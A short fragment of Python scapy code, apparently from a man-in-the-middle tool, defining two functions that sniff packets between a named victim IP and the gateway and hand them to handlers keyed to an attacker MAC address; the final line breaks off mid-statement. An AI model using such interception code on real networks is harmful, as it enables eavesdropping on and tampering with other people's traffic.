...
def gw_to_victim(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    scapy.sniff(filter = f"dst host {victim_ip} and src host {gw_ip}",prn=lambda packet: gw_to_victim_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip),timeout=seconds_to_run)
...
def victim_to_gw(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    scapy.sniff(filter = f"src host {victim_ip} and dst host {gw_ip}", prn=lambda packet: \
